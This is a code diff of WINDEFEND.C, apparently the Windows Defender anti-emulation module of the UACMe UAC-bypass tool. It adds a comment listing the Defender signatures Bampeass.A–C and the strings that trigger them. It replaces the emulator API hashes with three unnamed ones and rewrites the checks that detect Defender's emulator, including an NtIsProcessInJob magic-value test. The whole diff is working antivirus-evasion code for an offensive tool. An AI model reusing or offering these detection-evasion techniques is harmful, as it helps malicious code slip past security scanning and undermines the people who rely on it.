@@ -4,9 +4,9 @@
 *
 *  TITLE:       WINDEFEND.C
 *
-*  VERSION:     3.17
+*  VERSION:     3.18
 *
-*  DATE:        18 Mar 2019
+*  DATE:        29 Mar 2019
 *
 *  MSE / Windows Defender anti-emulation part.
 *
@@ -37,6 +37,36 @@
 #pragma warning(disable: 4055)
 #pragma warning(disable: 4152)
 
+/*
+
+WD Signatures
+
+Trojan:Win64/Bampeass.A
+
+Triggers:
+[ U C M ]   W u s a   f a i l e d   c o p y   H i b i k i
+% t e m p % \ H i b i k i . d l l
+E l e v a t i o n : A d m i n i s t r a t o r ! n e w : { 4 D 1 1 1 E 0 8 - C B F 7 - 4 f 1 2 - A 9 2 6 - 2 C 7 9 2 0 A F 5 2 F C }
+U A C M e   i n j e c t e d ,   F u b u k i   a t   y o u r   s e r v i c e
+
+
+Trojan:Win64/Bampeass.B
+
+Triggers:
+UACMe injected, Hibiki at your service.
+ucmLoadCallback, dll load %ws, DllBase = %
+
+
+Trojan:Win64/Bampeass.C
+
+Triggers:
+ucmLoadCallback, dll load %ws, DllBase = %p
+UACMe injected, Hibiki at your service.
+ucmLoadCallback, kernel32 base found
+
+*/
+
+
 //
 // General purpose hashes start here.
 //
@@ -58,30 +88,10 @@
 // End of Kuma related hashes.
 //
 
-#define WD_HASH_TABLE_ITEMS 21
-
 DWORD wdxEmulatorAPIHashTable[] = {
-    0x3E3CBE69, //VFS_CopyFile
-    0x00633A7F, //VFS_DeleteFile
-    0x331245AB, //VFS_DeleteFileByHandle
-    0xE0A858CF, //VFS_FileExists
-    0xDC54FFE2, //VFS_FindClose
-    0x1C920626, //VFS_FindFirstFile
-    0xAA3ABE29, //VFS_FindNextFile
-    0xBAC05205, //VFS_FlushViewOfFile
-    0xDB9EFF5A, //VFS_GetAttrib
-    0xDBB23222, //VFS_GetHandle
-    0xDBA02E4A, //VFS_GetLength
-    0xEB0B0115, //VFS_MapViewOfFile
-    0x302ABE69, //VFS_MoveFile
-    0x5F831879, //VFS_Open
-    0x5F82E329, //VFS_Read
-    0x7B9EFF5A, //VFS_SetAttrib
-    0x5DC47852, //VFS_SetCurrentDir
-    0x7BA02E4A, //VFS_SetLength
-    0xBAC23515, //VFS_UnmapViewOfFile
-    0xFC14FE63, //VFS_Write
-    0xD4908D6E  //NtControlChannel
+    0x70CE7692,
+    0xD4CE4554,
+    0x7A99CFAE
 };
 
 MP_API g_MpApiSet;
@@ -405,8 +415,11 @@ NTSTATUS wdIsEmulatorPresent(
 
     UNICODE_STRING usNtdll = RTL_CONSTANT_STRING(L"ntdll.dll");
 
-    if (!NT_SUCCESS(LdrGetDllHandle((PCWSTR)NULL, (PULONG)NULL, &usNtdll, (PVOID*)&ImageBase)))
+    if (!NT_SUCCESS(LdrGetDllHandleEx(LDR_GET_DLL_HANDLE_EX_UNCHANGED_REFCOUNT,
+        NULL, NULL, &usNtdll, &ImageBase)))
+    {
         return STATUS_DLL_NOT_FOUND;
+    }
 
     Exports = (IMAGE_EXPORT_DIRECTORY*)RtlImageDirectoryEntryToData(ImageBase, TRUE,
         IMAGE_DIRECTORY_ENTRY_EXPORT, &sz);
@@ -419,7 +432,7 @@ NTSTATUS wdIsEmulatorPresent(
 
     for (i = 0; i < Exports->NumberOfNames; i++) {
         Hash = wdxGetHashForString((char *)((PBYTE)DosHeader + Names[i]));
-        for (c = 0; c < WD_HASH_TABLE_ITEMS; c++) {
+        for (c = 0; c < RTL_NUMBER_OF(wdxEmulatorAPIHashTable); c++) {
             if (Hash == wdxEmulatorAPIHashTable[c])
                 return STATUS_NEEDS_REMEDIATION;
         }
@@ -440,46 +453,10 @@ NTSTATUS wdIsEmulatorPresent(
 * predefined values.
 *
 */
-BOOL wdIsEmulatorPresent2(
+BOOLEAN wdIsEmulatorPresent2(
     VOID)
-{
-    BOOL bResult = FALSE;
-    HANDLE hProcess = NULL;
-
-#pragma warning(push)
-#pragma warning(disable: 6387)
-
-    hProcess = OpenProcess(
-        PROCESS_QUERY_INFORMATION,
-        FALSE,
-        GetCurrentProcessId());
-
-    if (hProcess) {
-        bResult = ((ULONG_PTR)hProcess == 0x1234);
-        CloseHandle(hProcess);
-    }
-#pragma warning(pop)
-    return bResult;
-}
-
-/*
-* wdSelfTraverse
-*
-* Purpose:
-*
-* Determine if we can use Kuma to send a torpedo to the WD.
-*
-*/
-NTSTATUS wdSelfTraverse(
-    _In_ PVOID MpClientBase)
-{
-    UNREFERENCED_PARAMETER(MpClientBase);
-
-    //  
-    // Note: wdxInitApiSet must reflect difference between versions otherwise Kuma will fail.
-    //
-
-    return STATUS_NOT_IMPLEMENTED;
+{   
+    return NtIsProcessInJob(NtCurrentProcess(), UlongToHandle(10)) == 0x125;
 }
 
 #pragma warning(pop)
